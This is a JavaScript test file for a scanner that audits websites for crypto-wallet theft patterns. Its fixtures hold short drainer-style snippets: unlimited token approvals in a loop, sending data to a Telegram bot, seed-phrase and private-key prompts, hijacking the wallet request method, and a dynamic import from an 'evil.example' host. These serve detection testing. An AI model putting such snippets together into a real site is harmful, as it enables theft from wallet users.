import test from 'node:test';
import assert from 'node:assert/strict';
import { audit } from '../src/main/safety.js';

const enc = (s) => new TextEncoder().encode(s);
function site(map) {
  return {
    files: Object.entries(map).map(([path, v]) => ({ path, size: enc(v).length })),
    read: async (p) => (p in map ? enc(map[p]) : null),
  };
}
const keys = (r) => r.abilities.map((a) => a.key);
const text = (arr, level) => arr.filter((x) => !level || x.level === level).map((x) => x.text).join('\n');

test('普通网站：只连钱包、签消息，没有作恶特征', async () => {
  const r = await audit(site({
    'index.html': '<title>Gomoku</title><script src="app.js"></script>',
    'app.js': 'await window.ethereum.request({ method: "eth_requestAccounts" });\nawait ethereum.request({ method: "personal_sign", params });',
    'logo.png': 'x',
  }));
  assert.deepEqual(keys(r).sort(), ['connect', 'personalSign']);
  assert.equal(r.findings.length, 0);
  assert.deepEqual(r.abilities.find((a) => a.key === 'personalSign').where, ['app.js:2']);
  assert.equal(r.coverage.scanned > 0, true);
});

test('盗币工具包：查代币余额 + 循环无限授权 + Telegram 回传', async () => {
  const r = await audit(site({
    'index.html': '<title>Claim your airdrop</title><script src="d.js"></script>',
    'd.js': `const t = await fetch("https://api.covalenthq.com/v1/1/address/" + a + "/balances_v2/");
for (const tok of tokens) { await c.approve(SPENDER, "0x${'f'.repeat(64)}"); }
fetch("https://api.telegram.org/bot123:abc/sendMessage", { method: "POST", body });`,
  }));
  assert.ok(keys(r).includes('approve') && keys(r).includes('unlimited'));
  const d = text(r.findings, 'danger');
  assert.match(d, /值多少钱/);
  assert.match(d, /Telegram/);
  assert.match(text(r.findings, 'warn'), /空投/);
  assert.doesNotMatch(d, /循环里连续/);
});

test('骗助记词、劫持钱包、远程加载代码、混淆', async () => {
  const r = await audit(site({
    'index.html': '<title>Wallet</title><p>请输入你的助记词</p><textarea></textarea>',
    'a.js': 'window.ethereum.request = async (x) => orig(x);\nimport("https://evil.example/x.js");\n' + Array.from({ length: 30 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}`).join(';'),
  }));
  const d = text(r.findings, 'danger');
  assert.match(d, /助记词/);
  assert.match(d, /request 方法/);
  assert.match(d, /外部网址动态加载/);
  assert.match(text(r.findings, 'warn'), /混淆/);
});

test('写死的地址区分合约和普通钱包；授权 + 普通钱包要警告', async () => {
  const contract = '0x' + '1'.repeat(40);
  const wallet = '0x' + '2'.repeat(40);
  const r = await audit({
    ...site({ 'app.js': `const token = "${contract}"; const to = "${wallet}"; c.approve(to, 1); const m = "0xcA11bde05977b3631167028862bE2a173976CA11";` }),
    hasCode: async (list) => new Map(list.map((a) => [a, a === contract])),
  });
  assert.deepEqual(r.addresses.map((a) => [a.address, a.kind]), [[contract, 'contract'], [wallet, 'wallet']]);
  assert.match(text(r.findings, 'info'), new RegExp(wallet));
});

test('运行时的外部脚本、超限和读不到的文件列进覆盖范围', async () => {
  const s = site({ 'index.html': '<title>x</title>', 'b.js': 'x' });
  const r = await audit({ ...s, read: async (p) => (p === 'b.js' ? null : enc('<title>x</title>')), external: [{ origin: 'https://cdn.example.com', risky: true }], extraSkipped: ['big.js'] });
  assert.match(text(r.findings, 'warn'), /cdn\.example\.com/);
  assert.deepEqual(r.coverage.skipped.sort(), ['b.js', 'big.js']);
  assert.equal(r.coverage.remote, true);
});

test('翻译函数：所有文字都经过 tr', async () => {
  const r = await audit({ ...site({ 'a.js': 'eth_sendTransaction' }), tr: (s) => 'EN:' + s });
  assert.ok(r.abilities.every((a) => a.text.startsWith('EN:')));
});

test('说明文字里提到私钥、页面另有不相干的输入框，不算骗助记词', async () => {
  const r = await audit(site({
    'index.html': '<li>受托人在线下生成一对密钥，私钥由他离线保管。</li>' + 'x'.repeat(400) + '<input id="add" placeholder="如 4246.0">',
    'a.js': 'const sig = "0x0000000000000000000000000000000000000001";',
  }));
  assert.equal(r.findings.length, 0, JSON.stringify(r.findings));
  assert.equal(r.addresses.length, 0);
  const p = await audit(site({ 'a.js': 'el.innerHTML = `<input placeholder="Enter your private key">`;' }));
  assert.match(text(p.findings, 'danger'), /助记词或私钥/);
});

test('正常的钱包库写法不算作恶', async () => {
  const r = await audit(site({
    'wallet.js': 'p.isTapeWalletConnect = true;\nwindow.ethereum = p;\n',
    'sdk.js': 'window.ethereum=window.extension; getEndpoint(a,`/v1/chains/{chainId}/safes/{address}/balances/{currency}`); await c.approve(s, 1);',
    'modal.js': 'const wallets = ["MetaMask", "Trust Wallet"]; navigator.sendBeacon(u, d);',
  }));
  assert.deepEqual(r.findings.filter((f) => f.level !== 'info').map((f) => f.text), []);
  assert.match(text(r.findings, 'info'), /sendBeacon/);
});

test('只在循环里授权、不查资产：提醒留意，不算高危', async () => {
  const r = await audit(site({ 'a.js': 'for (const t of tokens) { await t.approve(router, amount); }' }));
  assert.match(text(r.findings, 'warn'), /循环/);
  assert.equal(r.findings.filter((f) => f.level === 'danger').length, 0);
});

test('冒充只看标题和可见文字，变量名不算', async () => {
  const ok = await audit(site({ 'index.html': '<title>Neon</title><script>async walletVerified(a){} const s="verify wallet";</script>' }));
  assert.equal(ok.findings.length, 0, JSON.stringify(ok.findings));
  const bad = await audit(site({ 'index.html': '<title>Home</title><h1>Verify your wallet to continue</h1>' }));
  assert.match(text(bad.findings, 'warn'), /冒充/);
});
